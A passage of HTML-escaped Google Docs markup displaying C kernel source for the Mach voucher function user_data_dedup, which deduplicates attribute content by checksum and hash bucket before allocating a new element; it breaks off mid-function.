BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c10"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id="t.7bb6adaf52c18b6e3e2890205d992e9ab2854f2f"&gt;&lt;/a&gt;&lt;a id="t.28"&gt;&lt;/a&gt;&lt;table class="BGLtzooHlW-c12"&gt;&lt;tbody&gt;&lt;tr class="BGLtzooHlW-c1"&gt;&lt;td class="BGLtzooHlW-c13" colspan="1" rowspan="1"&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;static&lt;/span&gt;&lt;span class="BGLtzooHlW-c3"&gt;&amp;nbsp;user_data_element_t&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;user_data_dedup&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; mach_voucher_attr_content_size_t &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t sum&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t hash&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_element_t elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_element_t alloc &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;NULL&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; sum &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;user_data_checksum&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hash &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;USER_DATA_HASH_BUCKET&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;sum&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c6"&gt;retry&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_lock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; queue_iterate&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;user_data_bucket&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;hash&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;],&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;user_data_element_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;e_hash_link&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;assert&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_hash &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;hash&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* if sums match... */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_sum &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;sum &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;amp;&amp;amp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_size &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t i&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* and all data matches */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;for&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;i &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;0&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;i &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;++)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_data&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;i&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;]&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;[&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;i&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;])&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;break&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;i &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;&amp;lt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;continue&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c7"&gt;/* ... we found a match... */&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_made&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;++;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;NULL &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;!=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;alloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; kfree&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;alloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;,&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;sizeof&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;alloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;+&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;return&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;elem&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;}&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;if&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;NULL &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;==&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;alloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;{&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; user_data_unlock&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;();&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0 BGLtzooHlW-c8"&gt;&lt;span class="BGLtzooHlW-c3"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;user_data_element_t&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;kalloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span class="BGLtzooHlW-c6"&gt;sizeof&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(*&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;alloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;)&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;+&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;);&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_made &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class="BGLtzooHlW-c15"&gt;1&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_size &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;content_size&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_sum &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;sum&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; alloc&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;-&amp;gt;&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;e_hash &lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;=&lt;/span&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp;hash&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;;&lt;/span&gt;&lt;/p&gt; &lt;p class="BGLtzooHlW-c0"&gt;&lt;span class="BGLtzooHlW-c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; memcpy&lt;/span&gt;&lt;span class="BGLtzooHlW-c2"&gt;(&lt;/span&gt;&lt;span 